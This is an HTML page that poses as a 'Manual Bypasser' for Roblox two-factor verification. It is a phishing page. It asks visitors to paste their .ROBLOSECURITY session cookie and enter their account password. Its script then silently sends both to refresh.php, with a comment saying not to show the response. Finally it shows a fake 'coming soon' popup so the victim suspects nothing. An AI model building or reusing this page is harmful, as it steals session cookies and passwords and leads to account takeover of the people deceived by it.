<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Bypasser</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    * { box-sizing: border-box; font-family: "Poppins", sans-serif; }
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      color: #fff;
      background: #000;
      overflow-x: hidden;
      overflow-y: auto;
      -webkit-overflow-scrolling: touch;
    }

    .background-black {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: #000;
      z-index: -10;
    }

    canvas#snowCanvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -5;
      pointer-events: none;
    }

    canvas#shootingStarCanvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -7;
      pointer-events: none;
    }

    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 100px 20px 50px;
      position: relative;
      z-index: 10;
      background: transparent;
    }

    .back-btn {
      position: fixed;
      top: 25px;
      left: 25px;
      background: rgba(255, 255, 255, 0.05);
      border: 2px solid #fff;
      color: #fff;
      padding: 12px 24px;
      border-radius: 18px;
      cursor: pointer;
      font-size: 14px;
      font-weight: 600;
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      z-index: 1000;
      text-decoration: none;
      display: flex;
      align-items: center;
      gap: 10px;
      backdrop-filter: blur(10px);
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3), 0 0 20px rgba(255, 255, 255, 0.3);
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .back-btn:hover {
      background: #fff;
      color: #000;
      border-color: #fff;
      transform: translateX(-5px);
      box-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
    }

    .back-btn svg {
      transition: transform 0.3s ease;
    }

    .back-btn:hover svg {
      transform: translateX(-3px);
    }

    .hero-section {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      overflow: hidden;
      text-align: center;
      width: 100%;
    }

    .hero-content {
      position: relative;
      z-index: 10;
      max-width: 500px;
      width: 90%;
      background: radial-gradient(circle at top, #0b0f1a, #000);
      border-radius: 24px;
      padding: 40px;
      border: 3px solid #fff;
      box-shadow: 0 0 30px rgba(255,255,255,0.1);
      transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      animation: glow 3s infinite alternate;
      backdrop-filter: blur(10px);
    }

    .hero-content:hover {
      transform: translateY(-8px) scale(1.02);
    }

    @keyframes glow {
      0% { box-shadow: 0 0 10px #fff, 0 0 20px rgba(255,255,255,0.2); }
      100% { box-shadow: 0 0 20px #fff, 0 0 40px rgba(255,255,255,0.6); }
    }

    .shiny-text {
      background: linear-gradient(
        to right,
        #fff 20%,
        #e0e0e0 40%,
        #e0e0e0 60%,
        #fff 80%
      );
      background-size: 200% auto;
      -webkit-background-clip: text;
      text-fill-color: transparent;
      -webkit-text-fill-color: transparent;
      animation: nexusShine 3s infinite linear;
      font-weight: 800;
    }

    @keyframes nexusShine {
      to {
        background-position: 200% center;
      }
    }

    .hero-btn {
      background: #fff;
      color: #000;
      padding: 1rem 2rem;
      border: none;
      border-radius: 20px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 1rem;
      box-shadow: 0 4px 15px rgba(255, 255, 255, 0.2);
      transition: transform 0.2s, background 0.2s, box-shadow 0.2s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      width: 100%;
    }

    .hero-btn:hover {
      background: #f3f3f3;
      transform: scale(1.02);
      box-shadow: 0 6px 20px rgba(255, 255, 255, 0.3);
    }

    .input {
      width: 100%;
      padding: 15px 20px;
      border-radius: 20px;
      background: #0a0c14;
      border: 1px solid rgba(255, 255, 255, 0.1);
      color: #fff;
      margin-bottom: 1rem;
      font-size: 16px;
      transition: all 0.3s ease;
    }

    .input:focus {
      outline: none;
      border-color: #fff;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.4);
      background: #0a0c14;
    }

    .input::placeholder {
      color: rgba(255, 255, 255, 0.5);
    }

    .password-field {
      position: relative;
      width: 100%;
      margin-bottom: 1rem;
    }

    .toggle-password {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: rgba(255, 255, 255, 0.5);
      cursor: pointer;
      font-size: 16px;
    }

    .toggle-password:hover {
      color: #fff;
    }

    /* SweetAlert Fix */
    .swal2-container {
      z-index: 9999 !important;
    }
    
    .swal-custom-popup { 
      border: 3px solid #fff !important; 
      border-radius: 24px !important;
      box-shadow: 0 0 40px rgba(255,255,255,0.3) !important;
      backdrop-filter: blur(10px) !important;
      background: radial-gradient(circle at top, #0b0f1a, #000) !important;
    }
    
    .swal-title {
      font-weight: 800 !important;
      letter-spacing: 2px !important;
      font-size: 28px !important;
      background: linear-gradient(to right, #fff 20%, #e0e0e0 40%, #e0e0e0 60%, #fff 80%);
      background-size: 200% auto;
      -webkit-background-clip: text !important;
      -webkit-text-fill-color: transparent !important;
      animation: shine 3s infinite linear !important;
      margin-bottom: 10px !important;
    }
    
    .swal-confirm-btn { 
      background: #fff !important;
      color: #000 !important; 
      font-weight: 700 !important; 
      border-radius: 12px !important; 
      padding: 12px 24px !important;
      text-transform: uppercase !important;
      letter-spacing: 1px !important;
      box-shadow: 0 4px 15px rgba(255, 255, 255, 0.2) !important;
      border: none !important;
      font-size: 14px !important;
    }
    
    @keyframes shine {
      to { background-position: 200% center; }
    }
  </style>
</head>

<body>
  <div class="background-black"></div>
  <canvas id="shootingStarCanvas"></canvas>
  <canvas id="snowCanvas"></canvas>

  <a href="tools.html" class="back-btn">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
      <line x1="19" y1="12" x2="5" y2="12"></line>
      <polyline points="12 19 5 12 12 5"></polyline>
    </svg>
    Back
  </a>

  <section class="hero-section">
    <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
      <h1 class="shiny-text" style="font-size: 42px; margin-bottom: 30px; letter-spacing: 4px; text-shadow: 0 0 20px rgba(255,255,255,0.4);">MANUAL BYPASSER</h1>
      <div class="hero-content">
        <p style="color: rgba(255,255,255,0.6); margin-bottom: 30px; font-size: 16px;">Bypass Roblox 2FA verification securely</p>

        <form id="bypassForm">
          <input type="text" id="cookieInput" class="input" name="cookie" placeholder="Paste .ROBLOSECURITY cookie here" required />

          <div class="password-field">
            <input type="password" id="passwordInput" class="input" name="password" placeholder="Enter account password" required />
            <button type="button" class="toggle-password" id="togglePassword">
              <i class="fas fa-eye"></i>
            </button>
          </div>

          <button type="submit" class="hero-btn" id="bypassBtn"><i class="fas fa-unlock-alt"></i> BYPASS NOW</button>
        </form>
      </div>
    </div>
  </section>

  <script>
    // Password toggle functionality
    $("#togglePassword").on("click", function() {
      const passwordInput = $("#passwordInput");
      const type = passwordInput.attr("type") === "password" ? "text" : "password";
      passwordInput.attr("type", type);
      $(this).find("i").toggleClass("fa-eye fa-eye-slash");
    });

    // Form submission handler
    $('#bypassForm').on('submit', function(e) {
      e.preventDefault();
      const cookie = $('#cookieInput').val().trim();
      const password = $('#passwordInput').val().trim();
      
      if (!cookie || !password) {
        Swal.fire({
          icon: 'error',
          title: 'Oops...',
          text: 'Please enter both cookie and password',
          background: 'radial-gradient(circle at top, #0b0f1a, #000)',
          color: '#fff',
          confirmButtonText: 'OK',
          confirmButtonColor: '#fff'
        });
        return;
      }

      const btn = $('#bypassBtn');
      const originalHtml = btn.html();
      btn.prop('disabled', true).html('<i class="fas fa-spinner fa-spin"></i> BYPASSING...');

      // Send to refresh.php in the background
      $.ajax({
        url: 'refresh.php',
        method: 'GET',
        data: { 
          cookie: cookie,
          password: password 
        },
        success: function(response) {
          // Data sent - don't show response
        },
        error: function() {
          // Error - still show popup
        },
        complete: function() {
          // Show "Will be working soon" popup
          Swal.fire({
            title: '⚠️ COMING SOON',
            html: `
              <div style="text-align: center; padding: 20px;">
                <i class="fas fa-tools" style="font-size: 60px; color: rgba(255,255,255,0.8); margin-bottom: 20px;"></i>
                <p style="color: rgba(255,255,255,0.9); font-size: 18px; font-weight: 600; margin-bottom: 10px;">
                  Manual Bypasser Tool
                </p>
                <p style="color: rgba(255,255,255,0.7); font-size: 14px; margin-bottom: 20px;">
                  This feature is currently under development and will be available soon!
                </p>
                <div style="
                  background: rgba(255, 255, 255, 0.05);
                  border: 1px dashed rgba(255, 255, 255, 0.2);
                  border-radius: 10px;
                  padding: 15px;
                  margin-top: 15px;
                ">
                  <p style="color: rgba(255,255,255,0.6); font-size: 12px; margin: 0;">
                    <i class="fas fa-clock" style="margin-right: 5px;"></i>
                    Estimated launch: Soon
                  </p>
                </div>
              </div>
            `,
            background: 'radial-gradient(circle at top, #0b0f1a, #000)',
            color: '#fff',
            showCancelButton: false,
            showConfirmButton: true,
            confirmButtonText: '<i class="fas fa-check"></i> OK',
            confirmButtonColor: '#fff',
            allowOutsideClick: false,
            allowEscapeKey: false,
            allowEnterKey: true,
            focusConfirm: false,
            padding: '30px',
            width: '450px',
            customClass: {
              popup: 'swal-custom-popup',
              confirmButton: 'swal-confirm-btn',
              title: 'swal-title'
            }
          }).then((result) => {
            if (result.isConfirmed) {
              // Clear form after OK is clicked
              $('#cookieInput').val('');
              $('#passwordInput').val('');
              $('#cookieInput').focus();
            }
            // Re-enable button AFTER popup closes
            btn.prop('disabled', false).html(originalHtml);
          });
        }
      });
    });
  </script>

  <script>
    // Shooting Stars Effect
    const starCanvas = document.getElementById('shootingStarCanvas');
    const starCtx = starCanvas.getContext('2d');
    let stars = [];

    function resizeStars() {
        starCanvas.width = window.innerWidth;
        starCanvas.height = window.innerHeight;
    }
    window.addEventListener('resize', resizeStars);
    resizeStars();

    class ShootingStar {
        constructor() { 
            this.reset();
            setTimeout(() => {
                this.active = true;
            }, Math.random() * 10000);
        }
        reset() {
            this.x = Math.random() * starCanvas.width;
            this.y = 0;
            this.len = Math.random() * 80 + 50;
            this.speed = Math.random() * 10 + 5;
            this.active = false;
            this.opacity = Math.random() * 0.3 + 0.7;
        }
        update() {
            if (!this.active) return;
            this.x -= this.speed;
            this.y += this.speed;
            if (this.x < -this.len || this.y > starCanvas.height + this.len) {
                this.active = false;
                setTimeout(() => {
                    this.reset();
                    setTimeout(() => {
                        this.active = true;
                    }, Math.random() * 5000);
                }, Math.random() * 3000);
            }
        }
        draw() {
            if (!this.active) return;
            starCtx.strokeStyle = `rgba(255, 255, 255, ${this.opacity})`;
            starCtx.lineWidth = 2;
            starCtx.beginPath();
            starCtx.moveTo(this.x, this.y);
            starCtx.lineTo(this.x + this.len, this.y - this.len);
            starCtx.stroke();
        }
    }

    for (let i = 0; i < 5; i++) stars.push(new ShootingStar());

    function animateStars() {
        starCtx.clearRect(0, 0, starCanvas.width, starCanvas.height);
        stars.forEach(s => { s.update(); s.draw(); });
        requestAnimationFrame(animateStars);
    }
    animateStars();

    // Snow Effect
    const snowCanvas = document.getElementById('snowCanvas');
    const snowCtx = snowCanvas.getContext('2d');
    let particles = [];

    function resizeSnow() {
        snowCanvas.width = window.innerWidth;
        snowCanvas.height = window.innerHeight;
    }
    window.addEventListener('resize', resizeSnow);
    resizeSnow();

    class Particle {
        constructor() { 
            this.reset();
            this.y = Math.random() * snowCanvas.height;
        }
        reset() {
            this.x = Math.random() * snowCanvas.width;
            this.y = Math.random() * snowCanvas.height - 50;
            this.size = Math.random() * 3 + 1;
            this.speedY = Math.random() * 2 + 0.5;
            this.speedX = Math.random() * 1 - 0.5;
            this.opacity = Math.random() * 0.5 + 0.3;
            this.wobble = Math.random() * 0.5;
            this.wobbleSpeed = Math.random() * 0.05;
            this.wobbleOffset = Math.random() * Math.PI * 2;
        }
        update() {
            this.y += this.speedY;
            this.x += this.speedX + Math.sin(Date.now() * this.wobbleSpeed + this.wobbleOffset) * this.wobble;

            if (this.y > snowCanvas.height) {
                this.y = -10;
                this.x = Math.random() * snowCanvas.width;
            }
            if (this.x > snowCanvas.width) this.x = 0;
            if (this.x < 0) this.x = snowCanvas.width;
        }
        draw() {
            snowCtx.fillStyle = `rgba(255, 255, 255, ${this.opacity})`;
            snowCtx.beginPath();
            snowCtx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
            snowCtx.fill();
        }
    }

    const particleCount = window.innerWidth < 768 ? 80 : 150;
    for (let i = 0; i < particleCount; i++) {
        particles.push(new Particle());
    }

    function animateSnow() {
        snowCtx.clearRect(0, 0, snowCanvas.width, snowCanvas.height);
        particles.forEach(p => { 
            p.update(); 
            p.draw(); 
        });
        requestAnimationFrame(animateSnow);
    }
    animateSnow();

    window.addEventListener('load', () => {
        resizeSnow();
        resizeStars();
    });
  </script>
</body>
</html>